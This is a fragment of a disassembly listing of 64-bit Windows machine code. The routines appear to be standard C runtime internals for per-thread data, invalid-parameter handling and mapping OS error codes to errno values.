   140005095:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
   140005099:	48 8d 15 60 a1 00 00 	lea    0xa160(%rip),%rdx        # 0x14000f200
   1400050a0:	b8 05 00 00 00       	mov    $0x5,%eax
   1400050a5:	89 45 20             	mov    %eax,0x20(%rbp)
   1400050a8:	89 45 28             	mov    %eax,0x28(%rbp)
   1400050ab:	48 8d 45 e8          	lea    -0x18(%rbp),%rax
   1400050af:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
   1400050b3:	b8 04 00 00 00       	mov    $0x4,%eax
   1400050b8:	89 45 e0             	mov    %eax,-0x20(%rbp)
   1400050bb:	89 45 e4             	mov    %eax,-0x1c(%rbp)
   1400050be:	48 8b 01             	mov    (%rcx),%rax
   1400050c1:	48 3b c2             	cmp    %rdx,%rax
   1400050c4:	74 0c                	je     0x1400050d2
   1400050c6:	48 8b c8             	mov    %rax,%rcx
   1400050c9:	e8 8a 07 00 00       	call   0x140005858
   1400050ce:	48 8b 4d e8          	mov    -0x18(%rbp),%rcx
   1400050d2:	48 8b 49 70          	mov    0x70(%rcx),%rcx
   1400050d6:	e8 7d 07 00 00       	call   0x140005858
   1400050db:	48 8b 4d e8          	mov    -0x18(%rbp),%rcx
   1400050df:	48 8b 49 58          	mov    0x58(%rcx),%rcx
   1400050e3:	e8 70 07 00 00       	call   0x140005858
   1400050e8:	48 8b 4d e8          	mov    -0x18(%rbp),%rcx
   1400050ec:	48 8b 49 60          	mov    0x60(%rcx),%rcx
   1400050f0:	e8 63 07 00 00       	call   0x140005858
   1400050f5:	48 8b 4d e8          	mov    -0x18(%rbp),%rcx
   1400050f9:	48 8b 49 68          	mov    0x68(%rcx),%rcx
   1400050fd:	e8 56 07 00 00       	call   0x140005858
   140005102:	48 8b 4d e8          	mov    -0x18(%rbp),%rcx
   140005106:	48 8b 49 48          	mov    0x48(%rcx),%rcx
   14000510a:	e8 49 07 00 00       	call   0x140005858
   14000510f:	48 8b 4d e8          	mov    -0x18(%rbp),%rcx
   140005113:	48 8b 49 50          	mov    0x50(%rcx),%rcx
   140005117:	e8 3c 07 00 00       	call   0x140005858
   14000511c:	48 8b 4d e8          	mov    -0x18(%rbp),%rcx
   140005120:	48 8b 49 78          	mov    0x78(%rcx),%rcx
   140005124:	e8 2f 07 00 00       	call   0x140005858
   140005129:	48 8b 4d e8          	mov    -0x18(%rbp),%rcx
   14000512d:	48 8b 89 80 00 00 00 	mov    0x80(%rcx),%rcx
   140005134:	e8 1f 07 00 00       	call   0x140005858
   140005139:	48 8b 4d e8          	mov    -0x18(%rbp),%rcx
   14000513d:	48 8b 89 c0 03 00 00 	mov    0x3c0(%rcx),%rcx
   140005144:	e8 0f 07 00 00       	call   0x140005858
   140005149:	4c 8d 4d 20          	lea    0x20(%rbp),%r9
   14000514d:	4c 8d 45 f0          	lea    -0x10(%rbp),%r8
   140005151:	48 8d 55 28          	lea    0x28(%rbp),%rdx
   140005155:	48 8d 4d 18          	lea    0x18(%rbp),%rcx
   140005159:	e8 d6 fd ff ff       	call   0x140004f34
   14000515e:	4c 8d 4d e0          	lea    -0x20(%rbp),%r9
   140005162:	4c 8d 45 f8          	lea    -0x8(%rbp),%r8
   140005166:	48 8d 55 e4          	lea    -0x1c(%rbp),%rdx
   14000516a:	48 8d 4d 18          	lea    0x18(%rbp),%rcx
   14000516e:	e8 39 fd ff ff       	call   0x140004eac
   140005173:	48 83 c4 40          	add    $0x40,%rsp
   140005177:	5d                   	pop    %rbp
   140005178:	c3                   	ret
   140005179:	cc                   	int3
   14000517a:	cc                   	int3
   14000517b:	cc                   	int3
   14000517c:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140005181:	57                   	push   %rdi
   140005182:	48 83 ec 20          	sub    $0x20,%rsp
   140005186:	48 8b f9             	mov    %rcx,%rdi
   140005189:	48 8b da             	mov    %rdx,%rbx
   14000518c:	48 8b 89 90 00 00 00 	mov    0x90(%rcx),%rcx
   140005193:	48 85 c9             	test   %rcx,%rcx
   140005196:	74 2c                	je     0x1400051c4
   140005198:	e8 2f 32 00 00       	call   0x1400083cc
   14000519d:	48 8b 8f 90 00 00 00 	mov    0x90(%rdi),%rcx
   1400051a4:	48 3b 0d ad 32 01 00 	cmp    0x132ad(%rip),%rcx        # 0x140018458
   1400051ab:	74 17                	je     0x1400051c4
   1400051ad:	48 8d 05 ec 23 01 00 	lea    0x123ec(%rip),%rax        # 0x1400175a0
   1400051b4:	48 3b c8             	cmp    %rax,%rcx
   1400051b7:	74 0b                	je     0x1400051c4
   1400051b9:	83 79 10 00          	cmpl   $0x0,0x10(%rcx)
   1400051bd:	75 05                	jne    0x1400051c4
   1400051bf:	e8 08 30 00 00       	call   0x1400081cc
   1400051c4:	48 89 9f 90 00 00 00 	mov    %rbx,0x90(%rdi)
   1400051cb:	48 85 db             	test   %rbx,%rbx
   1400051ce:	74 08                	je     0x1400051d8
   1400051d0:	48 8b cb             	mov    %rbx,%rcx
   1400051d3:	e8 68 2f 00 00       	call   0x140008140
   1400051d8:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1400051dd:	48 83 c4 20          	add    $0x20,%rsp
   1400051e1:	5f                   	pop    %rdi
   1400051e2:	c3                   	ret
   1400051e3:	cc                   	int3
   1400051e4:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400051e9:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   1400051ee:	57                   	push   %rdi
   1400051ef:	48 83 ec 20          	sub    $0x20,%rsp
   1400051f3:	ff 15 97 8e 00 00    	call   *0x8e97(%rip)        # 0x14000e090
   1400051f9:	8b 0d 51 1e 01 00    	mov    0x11e51(%rip),%ecx        # 0x140017050
   1400051ff:	8b d8                	mov    %eax,%ebx
   140005201:	83 f9 ff             	cmp    $0xffffffff,%ecx
   140005204:	74 1f                	je     0x140005225
   140005206:	e8 11 37 00 00       	call   0x14000891c
   14000520b:	48 8b f8             	mov    %rax,%rdi
   14000520e:	48 85 c0             	test   %rax,%rax
   140005211:	74 0c                	je     0x14000521f
   140005213:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   140005217:	75 73                	jne    0x14000528c
   140005219:	33 ff                	xor    %edi,%edi
   14000521b:	33 f6                	xor    %esi,%esi
   14000521d:	eb 70                	jmp    0x14000528f
   14000521f:	8b 0d 2b 1e 01 00    	mov    0x11e2b(%rip),%ecx        # 0x140017050
   140005225:	48 83 ca ff          	or     $0xffffffffffffffff,%rdx
   140005229:	e8 36 37 00 00       	call   0x140008964
   14000522e:	85 c0                	test   %eax,%eax
   140005230:	74 e7                	je     0x140005219
   140005232:	ba c8 03 00 00       	mov    $0x3c8,%edx
   140005237:	b9 01 00 00 00       	mov    $0x1,%ecx
   14000523c:	e8 9f 05 00 00       	call   0x1400057e0
   140005241:	8b 0d 09 1e 01 00    	mov    0x11e09(%rip),%ecx        # 0x140017050
   140005247:	48 8b f8             	mov    %rax,%rdi
   14000524a:	48 85 c0             	test   %rax,%rax
   14000524d:	75 10                	jne    0x14000525f
   14000524f:	33 d2                	xor    %edx,%edx
   140005251:	e8 0e 37 00 00       	call   0x140008964
   140005256:	33 c9                	xor    %ecx,%ecx
   140005258:	e8 fb 05 00 00       	call   0x140005858
   14000525d:	eb ba                	jmp    0x140005219
   14000525f:	48 8b d7             	mov    %rdi,%rdx
   140005262:	e8 fd 36 00 00       	call   0x140008964
   140005267:	85 c0                	test   %eax,%eax
   140005269:	75 12                	jne    0x14000527d
   14000526b:	8b 0d df 1d 01 00    	mov    0x11ddf(%rip),%ecx        # 0x140017050
   140005271:	33 d2                	xor    %edx,%edx
   140005273:	e8 ec 36 00 00       	call   0x140008964
   140005278:	48 8b cf             	mov    %rdi,%rcx
   14000527b:	eb db                	jmp    0x140005258
   14000527d:	48 8b cf             	mov    %rdi,%rcx
   140005280:	e8 0f fd ff ff       	call   0x140004f94
   140005285:	33 c9                	xor    %ecx,%ecx
   140005287:	e8 cc 05 00 00       	call   0x140005858
   14000528c:	48 8b f7             	mov    %rdi,%rsi
   14000528f:	8b cb                	mov    %ebx,%ecx
   140005291:	ff 15 01 8e 00 00    	call   *0x8e01(%rip)        # 0x14000e098
   140005297:	48 f7 df             	neg    %rdi
   14000529a:	48 1b c0             	sbb    %rax,%rax
   14000529d:	48 23 c6             	and    %rsi,%rax
   1400052a0:	74 10                	je     0x1400052b2
   1400052a2:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1400052a7:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   1400052ac:	48 83 c4 20          	add    $0x20,%rsp
   1400052b0:	5f                   	pop    %rdi
   1400052b1:	c3                   	ret
   1400052b2:	e8 89 f9 ff ff       	call   0x140004c40
   1400052b7:	cc                   	int3
   1400052b8:	40 53                	rex push %rbx
   1400052ba:	48 83 ec 20          	sub    $0x20,%rsp
   1400052be:	8b 0d 8c 1d 01 00    	mov    0x11d8c(%rip),%ecx        # 0x140017050
   1400052c4:	83 f9 ff             	cmp    $0xffffffff,%ecx
   1400052c7:	74 1b                	je     0x1400052e4
   1400052c9:	e8 4e 36 00 00       	call   0x14000891c
   1400052ce:	48 8b d8             	mov    %rax,%rbx
   1400052d1:	48 85 c0             	test   %rax,%rax
   1400052d4:	74 08                	je     0x1400052de
   1400052d6:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   1400052da:	74 7d                	je     0x140005359
   1400052dc:	eb 6d                	jmp    0x14000534b
   1400052de:	8b 0d 6c 1d 01 00    	mov    0x11d6c(%rip),%ecx        # 0x140017050
   1400052e4:	48 83 ca ff          	or     $0xffffffffffffffff,%rdx
   1400052e8:	e8 77 36 00 00       	call   0x140008964
   1400052ed:	85 c0                	test   %eax,%eax
   1400052ef:	74 68                	je     0x140005359
   1400052f1:	ba c8 03 00 00       	mov    $0x3c8,%edx
   1400052f6:	b9 01 00 00 00       	mov    $0x1,%ecx
   1400052fb:	e8 e0 04 00 00       	call   0x1400057e0
   140005300:	8b 0d 4a 1d 01 00    	mov    0x11d4a(%rip),%ecx        # 0x140017050
   140005306:	48 8b d8             	mov    %rax,%rbx
   140005309:	48 85 c0             	test   %rax,%rax
   14000530c:	75 10                	jne    0x14000531e
   14000530e:	33 d2                	xor    %edx,%edx
   140005310:	e8 4f 36 00 00       	call   0x140008964
   140005315:	33 c9                	xor    %ecx,%ecx
   140005317:	e8 3c 05 00 00       	call   0x140005858
   14000531c:	eb 3b                	jmp    0x140005359
   14000531e:	48 8b d3             	mov    %rbx,%rdx
   140005321:	e8 3e 36 00 00       	call   0x140008964
   140005326:	85 c0                	test   %eax,%eax
   140005328:	75 12                	jne    0x14000533c
   14000532a:	8b 0d 20 1d 01 00    	mov    0x11d20(%rip),%ecx        # 0x140017050
   140005330:	33 d2                	xor    %edx,%edx
   140005332:	e8 2d 36 00 00       	call   0x140008964
   140005337:	48 8b cb             	mov    %rbx,%rcx
   14000533a:	eb db                	jmp    0x140005317
   14000533c:	48 8b cb             	mov    %rbx,%rcx
   14000533f:	e8 50 fc ff ff       	call   0x140004f94
   140005344:	33 c9                	xor    %ecx,%ecx
   140005346:	e8 0d 05 00 00       	call   0x140005858
   14000534b:	48 85 db             	test   %rbx,%rbx
   14000534e:	74 09                	je     0x140005359
   140005350:	48 8b c3             	mov    %rbx,%rax
   140005353:	48 83 c4 20          	add    $0x20,%rsp
   140005357:	5b                   	pop    %rbx
   140005358:	c3                   	ret
   140005359:	e8 e2 f8 ff ff       	call   0x140004c40
   14000535e:	cc                   	int3
   14000535f:	cc                   	int3
   140005360:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140005365:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   14000536a:	57                   	push   %rdi
   14000536b:	48 83 ec 20          	sub    $0x20,%rsp
   14000536f:	ff 15 1b 8d 00 00    	call   *0x8d1b(%rip)        # 0x14000e090
   140005375:	8b 0d d5 1c 01 00    	mov    0x11cd5(%rip),%ecx        # 0x140017050
   14000537b:	8b d8                	mov    %eax,%ebx
   14000537d:	83 f9 ff             	cmp    $0xffffffff,%ecx
   140005380:	74 1f                	je     0x1400053a1
   140005382:	e8 95 35 00 00       	call   0x14000891c
   140005387:	48 8b f8             	mov    %rax,%rdi
   14000538a:	48 85 c0             	test   %rax,%rax
   14000538d:	74 0c                	je     0x14000539b
   14000538f:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   140005393:	75 73                	jne    0x140005408
   140005395:	33 ff                	xor    %edi,%edi
   140005397:	33 f6                	xor    %esi,%esi
   140005399:	eb 70                	jmp    0x14000540b
   14000539b:	8b 0d af 1c 01 00    	mov    0x11caf(%rip),%ecx        # 0x140017050
   1400053a1:	48 83 ca ff          	or     $0xffffffffffffffff,%rdx
   1400053a5:	e8 ba 35 00 00       	call   0x140008964
   1400053aa:	85 c0                	test   %eax,%eax
   1400053ac:	74 e7                	je     0x140005395
   1400053ae:	ba c8 03 00 00       	mov    $0x3c8,%edx
   1400053b3:	b9 01 00 00 00       	mov    $0x1,%ecx
   1400053b8:	e8 23 04 00 00       	call   0x1400057e0
   1400053bd:	8b 0d 8d 1c 01 00    	mov    0x11c8d(%rip),%ecx        # 0x140017050
   1400053c3:	48 8b f8             	mov    %rax,%rdi
   1400053c6:	48 85 c0             	test   %rax,%rax
   1400053c9:	75 10                	jne    0x1400053db
   1400053cb:	33 d2                	xor    %edx,%edx
   1400053cd:	e8 92 35 00 00       	call   0x140008964
   1400053d2:	33 c9                	xor    %ecx,%ecx
   1400053d4:	e8 7f 04 00 00       	call   0x140005858
   1400053d9:	eb ba                	jmp    0x140005395
   1400053db:	48 8b d7             	mov    %rdi,%rdx
   1400053de:	e8 81 35 00 00       	call   0x140008964
   1400053e3:	85 c0                	test   %eax,%eax
   1400053e5:	75 12                	jne    0x1400053f9
   1400053e7:	8b 0d 63 1c 01 00    	mov    0x11c63(%rip),%ecx        # 0x140017050
   1400053ed:	33 d2                	xor    %edx,%edx
   1400053ef:	e8 70 35 00 00       	call   0x140008964
   1400053f4:	48 8b cf             	mov    %rdi,%rcx
   1400053f7:	eb db                	jmp    0x1400053d4
   1400053f9:	48 8b cf             	mov    %rdi,%rcx
   1400053fc:	e8 93 fb ff ff       	call   0x140004f94
   140005401:	33 c9                	xor    %ecx,%ecx
   140005403:	e8 50 04 00 00       	call   0x140005858
   140005408:	48 8b f7             	mov    %rdi,%rsi
   14000540b:	8b cb                	mov    %ebx,%ecx
   14000540d:	ff 15 85 8c 00 00    	call   *0x8c85(%rip)        # 0x14000e098
   140005413:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140005418:	48 f7 df             	neg    %rdi
   14000541b:	48 1b c0             	sbb    %rax,%rax
   14000541e:	48 23 c6             	and    %rsi,%rax
   140005421:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   140005426:	48 83 c4 20          	add    $0x20,%rsp
   14000542a:	5f                   	pop    %rdi
   14000542b:	c3                   	ret
   14000542c:	48 83 ec 28          	sub    $0x28,%rsp
   140005430:	48 8d 0d 2d fc ff ff 	lea    -0x3d3(%rip),%rcx        # 0x140005064
   140005437:	e8 50 34 00 00       	call   0x14000888c
   14000543c:	89 05 0e 1c 01 00    	mov    %eax,0x11c0e(%rip)        # 0x140017050
   140005442:	83 f8 ff             	cmp    $0xffffffff,%eax
   140005445:	75 04                	jne    0x14000544b
   140005447:	32 c0                	xor    %al,%al
   140005449:	eb 15                	jmp    0x140005460
   14000544b:	e8 10 ff ff ff       	call   0x140005360
   140005450:	48 85 c0             	test   %rax,%rax
   140005453:	75 09                	jne    0x14000545e
   140005455:	33 c9                	xor    %ecx,%ecx
   140005457:	e8 0c 00 00 00       	call   0x140005468
   14000545c:	eb e9                	jmp    0x140005447
   14000545e:	b0 01                	mov    $0x1,%al
   140005460:	48 83 c4 28          	add    $0x28,%rsp
   140005464:	c3                   	ret
   140005465:	cc                   	int3
   140005466:	cc                   	int3
   140005467:	cc                   	int3
   140005468:	48 83 ec 28          	sub    $0x28,%rsp
   14000546c:	8b 0d de 1b 01 00    	mov    0x11bde(%rip),%ecx        # 0x140017050
   140005472:	83 f9 ff             	cmp    $0xffffffff,%ecx
   140005475:	74 0c                	je     0x140005483
   140005477:	e8 58 34 00 00       	call   0x1400088d4
   14000547c:	83 0d cd 1b 01 00 ff 	orl    $0xffffffff,0x11bcd(%rip)        # 0x140017050
   140005483:	b0 01                	mov    $0x1,%al
   140005485:	48 83 c4 28          	add    $0x28,%rsp
   140005489:	c3                   	ret
   14000548a:	cc                   	int3
   14000548b:	cc                   	int3
   14000548c:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   140005491:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   140005496:	55                   	push   %rbp
   140005497:	57                   	push   %rdi
   140005498:	41 56                	push   %r14
   14000549a:	48 8d ac 24 10 fb ff 	lea    -0x4f0(%rsp),%rbp
   1400054a1:	ff 
   1400054a2:	48 81 ec f0 05 00 00 	sub    $0x5f0,%rsp
   1400054a9:	48 8b 05 78 1b 01 00 	mov    0x11b78(%rip),%rax        # 0x140017028
   1400054b0:	48 33 c4             	xor    %rsp,%rax
   1400054b3:	48 89 85 e0 04 00 00 	mov    %rax,0x4e0(%rbp)
   1400054ba:	41 8b f8             	mov    %r8d,%edi
   1400054bd:	8b f2                	mov    %edx,%esi
   1400054bf:	8b d9                	mov    %ecx,%ebx
   1400054c1:	83 f9 ff             	cmp    $0xffffffff,%ecx
   1400054c4:	74 05                	je     0x1400054cb
   1400054c6:	e8 49 cd ff ff       	call   0x140002214
   1400054cb:	33 d2                	xor    %edx,%edx
   1400054cd:	48 8d 4c 24 70       	lea    0x70(%rsp),%rcx
   1400054d2:	41 b8 98 00 00 00    	mov    $0x98,%r8d
   1400054d8:	e8 a3 d4 ff ff       	call   0x140002980
   1400054dd:	33 d2                	xor    %edx,%edx
   1400054df:	48 8d 4d 10          	lea    0x10(%rbp),%rcx
   1400054e3:	41 b8 d0 04 00 00    	mov    $0x4d0,%r8d
   1400054e9:	e8 92 d4 ff ff       	call   0x140002980
   1400054ee:	48 8d 44 24 70       	lea    0x70(%rsp),%rax
   1400054f3:	48 89 44 24 48       	mov    %rax,0x48(%rsp)
   1400054f8:	48 8d 4d 10          	lea    0x10(%rbp),%rcx
   1400054fc:	48 8d 45 10          	lea    0x10(%rbp),%rax
   140005500:	48 89 44 24 50       	mov    %rax,0x50(%rsp)
   140005505:	ff 15 35 8b 00 00    	call   *0x8b35(%rip)        # 0x14000e040
   14000550b:	4c 8b b5 08 01 00 00 	mov    0x108(%rbp),%r14
   140005512:	48 8d 54 24 40       	lea    0x40(%rsp),%rdx
   140005517:	49 8b ce             	mov    %r14,%rcx
   14000551a:	45 33 c0             	xor    %r8d,%r8d
   14000551d:	ff 15 25 8b 00 00    	call   *0x8b25(%rip)        # 0x14000e048
   140005523:	48 85 c0             	test   %rax,%rax
   140005526:	74 36                	je     0x14000555e
   140005528:	48 83 64 24 38 00    	andq   $0x0,0x38(%rsp)
   14000552e:	48 8d 4c 24 58       	lea    0x58(%rsp),%rcx
   140005533:	48 8b 54 24 40       	mov    0x40(%rsp),%rdx
   140005538:	4c 8b c8             	mov    %rax,%r9
   14000553b:	48 89 4c 24 30       	mov    %rcx,0x30(%rsp)
   140005540:	4d 8b c6             	mov    %r14,%r8
   140005543:	48 8d 4c 24 60       	lea    0x60(%rsp),%rcx
   140005548:	48 89 4c 24 28       	mov    %rcx,0x28(%rsp)
   14000554d:	48 8d 4d 10          	lea    0x10(%rbp),%rcx
   140005551:	48 89 4c 24 20       	mov    %rcx,0x20(%rsp)
   140005556:	33 c9                	xor    %ecx,%ecx
   140005558:	ff 15 f2 8a 00 00    	call   *0x8af2(%rip)        # 0x14000e050
   14000555e:	48 8b 85 08 05 00 00 	mov    0x508(%rbp),%rax
   140005565:	48 89 85 08 01 00 00 	mov    %rax,0x108(%rbp)
   14000556c:	48 8d 85 08 05 00 00 	lea    0x508(%rbp),%rax
   140005573:	48 83 c0 08          	add    $0x8,%rax
   140005577:	89 74 24 70          	mov    %esi,0x70(%rsp)
   14000557b:	48 89 85 a8 00 00 00 	mov    %rax,0xa8(%rbp)
   140005582:	48 8b 85 08 05 00 00 	mov    0x508(%rbp),%rax
   140005589:	48 89 45 80          	mov    %rax,-0x80(%rbp)
   14000558d:	89 7c 24 74          	mov    %edi,0x74(%rsp)
   140005591:	ff 15 c1 8a 00 00    	call   *0x8ac1(%rip)        # 0x14000e058
   140005597:	33 c9                	xor    %ecx,%ecx
   140005599:	8b f8                	mov    %eax,%edi
   14000559b:	ff 15 c7 8a 00 00    	call   *0x8ac7(%rip)        # 0x14000e068
   1400055a1:	48 8d 4c 24 48       	lea    0x48(%rsp),%rcx
   1400055a6:	ff 15 b4 8a 00 00    	call   *0x8ab4(%rip)        # 0x14000e060
   1400055ac:	85 c0                	test   %eax,%eax
   1400055ae:	75 10                	jne    0x1400055c0
   1400055b0:	85 ff                	test   %edi,%edi
   1400055b2:	75 0c                	jne    0x1400055c0
   1400055b4:	83 fb ff             	cmp    $0xffffffff,%ebx
   1400055b7:	74 07                	je     0x1400055c0
   1400055b9:	8b cb                	mov    %ebx,%ecx
   1400055bb:	e8 54 cc ff ff       	call   0x140002214
   1400055c0:	48 8b 8d e0 04 00 00 	mov    0x4e0(%rbp),%rcx
   1400055c7:	48 33 cc             	xor    %rsp,%rcx
   1400055ca:	e8 21 7e 00 00       	call   0x14000d3f0
   1400055cf:	4c 8d 9c 24 f0 05 00 	lea    0x5f0(%rsp),%r11
   1400055d6:	00 
   1400055d7:	49 8b 5b 28          	mov    0x28(%r11),%rbx
   1400055db:	49 8b 73 30          	mov    0x30(%r11),%rsi
   1400055df:	49 8b e3             	mov    %r11,%rsp
   1400055e2:	41 5e                	pop    %r14
   1400055e4:	5f                   	pop    %rdi
   1400055e5:	5d                   	pop    %rbp
   1400055e6:	c3                   	ret
   1400055e7:	cc                   	int3
   1400055e8:	48 89 0d f1 27 01 00 	mov    %rcx,0x127f1(%rip)        # 0x140017de0
   1400055ef:	c3                   	ret
   1400055f0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400055f5:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   1400055fa:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   1400055ff:	57                   	push   %rdi
   140005600:	48 83 ec 30          	sub    $0x30,%rsp
   140005604:	41 8b d9             	mov    %r9d,%ebx
   140005607:	49 8b f8             	mov    %r8,%rdi
   14000560a:	48 8b f2             	mov    %rdx,%rsi
   14000560d:	48 8b e9             	mov    %rcx,%rbp
   140005610:	e8 4b fd ff ff       	call   0x140005360
   140005615:	48 85 c0             	test   %rax,%rax
   140005618:	74 3d                	je     0x140005657
   14000561a:	48 8b 80 b8 03 00 00 	mov    0x3b8(%rax),%rax
   140005621:	48 85 c0             	test   %rax,%rax
   140005624:	74 31                	je     0x140005657
   140005626:	48 8b 54 24 60       	mov    0x60(%rsp),%rdx
   14000562b:	44 8b cb             	mov    %ebx,%r9d
   14000562e:	48 89 54 24 20       	mov    %rdx,0x20(%rsp)
   140005633:	4c 8b c7             	mov    %rdi,%r8
   140005636:	48 8b d6             	mov    %rsi,%rdx
   140005639:	48 8b cd             	mov    %rbp,%rcx
   14000563c:	ff 15 f6 8b 00 00    	call   *0x8bf6(%rip)        # 0x14000e238
   140005642:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   140005647:	48 8b 6c 24 48       	mov    0x48(%rsp),%rbp
   14000564c:	48 8b 74 24 50       	mov    0x50(%rsp),%rsi
   140005651:	48 83 c4 30          	add    $0x30,%rsp
   140005655:	5f                   	pop    %rdi
   140005656:	c3                   	ret
   140005657:	4c 8b 15 ca 19 01 00 	mov    0x119ca(%rip),%r10        # 0x140017028
   14000565e:	44 8b cb             	mov    %ebx,%r9d
   140005661:	41 8b ca             	mov    %r10d,%ecx
   140005664:	4c 8b c7             	mov    %rdi,%r8
   140005667:	4c 33 15 72 27 01 00 	xor    0x12772(%rip),%r10        # 0x140017de0
   14000566e:	83 e1 3f             	and    $0x3f,%ecx
   140005671:	49 d3 ca             	ror    %cl,%r10
   140005674:	48 8b d6             	mov    %rsi,%rdx
   140005677:	4d 85 d2             	test   %r10,%r10
   14000567a:	74 0f                	je     0x14000568b
   14000567c:	48 8b 4c 24 60       	mov    0x60(%rsp),%rcx
   140005681:	49 8b c2             	mov    %r10,%rax
   140005684:	48 89 4c 24 20       	mov    %rcx,0x20(%rsp)
   140005689:	eb ae                	jmp    0x140005639
   14000568b:	48 8b 44 24 60       	mov    0x60(%rsp),%rax
   140005690:	48 8b cd             	mov    %rbp,%rcx
   140005693:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140005698:	e8 23 00 00 00       	call   0x1400056c0
   14000569d:	cc                   	int3
   14000569e:	cc                   	int3
   14000569f:	cc                   	int3
   1400056a0:	48 83 ec 38          	sub    $0x38,%rsp
   1400056a4:	48 83 64 24 20 00    	andq   $0x0,0x20(%rsp)
   1400056aa:	45 33 c9             	xor    %r9d,%r9d
   1400056ad:	45 33 c0             	xor    %r8d,%r8d
   1400056b0:	33 d2                	xor    %edx,%edx
   1400056b2:	33 c9                	xor    %ecx,%ecx
   1400056b4:	e8 37 ff ff ff       	call   0x1400055f0
   1400056b9:	48 83 c4 38          	add    $0x38,%rsp
   1400056bd:	c3                   	ret
   1400056be:	cc                   	int3
   1400056bf:	cc                   	int3
   1400056c0:	48 83 ec 28          	sub    $0x28,%rsp
   1400056c4:	b9 17 00 00 00       	mov    $0x17,%ecx
   1400056c9:	ff 15 a9 89 00 00    	call   *0x89a9(%rip)        # 0x14000e078
   1400056cf:	85 c0                	test   %eax,%eax
   1400056d1:	74 07                	je     0x1400056da
   1400056d3:	b9 05 00 00 00       	mov    $0x5,%ecx
   1400056d8:	cd 29                	int    $0x29
   1400056da:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   1400056e0:	ba 17 04 00 c0       	mov    $0xc0000417,%edx
   1400056e5:	41 8d 48 01          	lea    0x1(%r8),%ecx
   1400056e9:	e8 9e fd ff ff       	call   0x14000548c
   1400056ee:	ff 15 1c 8a 00 00    	call   *0x8a1c(%rip)        # 0x14000e110
   1400056f4:	48 8b c8             	mov    %rax,%rcx
   1400056f7:	ba 17 04 00 c0       	mov    $0xc0000417,%edx
   1400056fc:	48 83 c4 28          	add    $0x28,%rsp
   140005700:	48 ff 25 19 8a 00 00 	rex.W jmp *0x8a19(%rip)        # 0x14000e120
   140005707:	cc                   	int3
   140005708:	33 c0                	xor    %eax,%eax
   14000570a:	4c 8d 0d ef 9c 00 00 	lea    0x9cef(%rip),%r9        # 0x14000f400
   140005711:	49 8b d1             	mov    %r9,%rdx
   140005714:	44 8d 40 08          	lea    0x8(%rax),%r8d
   140005718:	3b 0a                	cmp    (%rdx),%ecx
   14000571a:	74 2b                	je     0x140005747
   14000571c:	ff c0                	inc    %eax
   14000571e:	49 03 d0             	add    %r8,%rdx
   140005721:	83 f8 2d             	cmp    $0x2d,%eax
   140005724:	72 f2                	jb     0x140005718
   140005726:	8d 41 ed             	lea    -0x13(%rcx),%eax
   140005729:	83 f8 11             	cmp    $0x11,%eax
   14000572c:	77 06                	ja     0x140005734
   14000572e:	b8 0d 00 00 00       	mov    $0xd,%eax
   140005733:	c3                   	ret
   140005734:	81 c1 44 ff ff ff    	add    $0xffffff44,%ecx
   14000573a:	b8 16 00 00 00       	mov    $0x16,%eax
   14000573f:	83 f9 0e             	cmp    $0xe,%ecx
   140005742:	41 0f 46 c0          	cmovbe %r8d,%eax
   140005746:	c3                   	ret
   140005747:	41 8b 44 c1 04       	mov    0x4(%r9,%rax,8),%eax
   14000574c:	c3                   	ret
   14000574d:	cc                   	int3
   14000574e:	cc                   	int3
   14000574f:	cc                   	int3
   140005750:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140005755:	57                   	push   %rdi
   140005756:	48 83 ec 20          	sub    $0x20,%rsp
   14000575a:	8b f9                	mov    %ecx,%edi
   14000575c:	e8 ff fb ff ff       	call   0x140005360
   140005761:	48 85 c0             	test   %rax,%rax
   140005764:	75 09                	jne    0x14000576f
   140005766:	48 8d 05 eb 18 01 00 	lea    0x118eb(%rip),%rax        # 0x140017058
   14000576d:	eb 04                	jmp    0x140005773
   14000576f:	48 83 c0 24          	add    $0x24,%rax
   140005773:	89 38                	mov    %edi,(%rax)
   140005775:	e8 e6 fb ff ff       	call   0x140005360
   14000577a:	48 8d 1d d3 18 01 00 	lea    0x118d3(%rip),%rbx        # 0x140017054
   140005781:	48 85 c0             	test   %rax,%rax
   140005784:	74 04                	je     0x14000578a
   140005786:	48 8d 58 20          	lea    0x20(%rax),%rbx
   14000578a:	8b cf                	mov    %edi,%ecx
   14000578c:	e8 77 ff ff ff       	call   0x140005708
   140005791:	89 03                	mov    %eax,(%rbx)
   140005793:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140005798:	48 83 c4 20          	add    $0x20,%rsp
   14000579c:	5f                   	pop    %rdi
   14000579d:	c3                   	ret
   14000579e:	cc                   	int3
   14000579f:	cc                   	int3
   1400057a0:	48 83 ec 28          	sub    $0x28,%rsp
   1400057a4:	e8 b7 fb ff ff       	call   0x140005360
   1400057a9:	48 85 c0             	test   %rax,%rax
   1400057ac:	75 09                	jne    0x1400057b7
   1400057ae:	48 8d 05 a3 18 01 00 	lea    0x118a3(%rip),%rax        # 0x140017058
   1400057b5:	eb 04                	jmp    0x1400057bb
   1400057b7:	48 83 c0 24          	add    $0x24,%rax
   1400057bb:	48 83 c4 28          	add    $0x28,%rsp
   1400057bf:	c3                   	ret
